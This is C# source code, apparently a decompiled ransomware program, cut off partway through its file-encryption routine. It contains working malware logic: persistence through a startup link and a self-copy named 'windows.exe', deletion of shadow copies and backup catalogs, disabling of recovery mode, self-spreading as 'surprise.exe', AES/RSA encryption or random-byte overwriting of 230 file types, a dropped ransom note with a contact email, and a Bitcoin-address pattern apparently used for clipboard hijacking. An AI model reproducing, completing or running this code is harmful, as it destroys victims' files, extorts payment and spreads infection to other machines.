using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "sex";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "windows.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[15]
	{
		"                                                     HI THERE", "___________________________________________________________________________________________________________________", "___________________________________________________________________________________________________________________", "*******************************************************************************************************************", "*******************************************************************************************************************", "Your computer was infected with a ransomware virus. Your files have been encrypted and you won't ", "be able to decrypt them without our help.What can I do to get my files back?You want  special ", "decryption software, this software will allow you to recover all of your data and remove the", "ransomware from your computer.", "",
		"contact only email:-adnilavanmin@gmail.com", "********************************************************************************************************************", "********************************************************************************************************************", "____________________________________________________________________________________________________________________", "____________________________________________________________________________________________________________________"
	};

	private static string[] validExtensions = new string[230]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d", ".exe"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly()!.Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			string extension;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152L)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000L)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>5HQXcl0PqttlPfXkUxorEoMCsHh3k+P+ZlYA2cbJSApEV5zOvQjPdh4gNV3RSSIOhcSdA3dcNnX/zajqI5A6vwEsRw9DBEL8oVjoRcT6h4xZ38dTiDQsl+S7U+C6CQd6VDf2Fw5uShz8FmGLfDFe5AeTAPUbu6KxN/qBvIr2nqc=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
